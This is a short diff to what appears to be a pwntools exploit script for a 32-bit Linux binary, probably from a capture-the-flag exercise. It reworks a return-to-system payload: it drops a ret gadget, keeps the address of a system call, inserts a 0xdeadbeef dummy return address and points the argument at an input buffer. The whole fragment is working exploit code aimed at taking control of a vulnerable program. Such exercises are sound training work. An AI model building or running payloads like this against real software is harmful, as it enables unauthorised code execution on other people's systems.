@@ -6,12 +6,13 @@ context(os="linux", arch="i386")
 context.log_level = "debug"
 
 addr_sys = 0x8049284 
-addr_ret = 0x0804812f
+# addr_ret = 0x0804812f # no need
 addr_input = 0x0811EB40
 
 payload = flat([
-    addr_ret,
+    # addr_ret,
     addr_sys,
+    0xdeadbeef,
     addr_input - 4 # -4 is for the 'pop ebp'
 ])
 
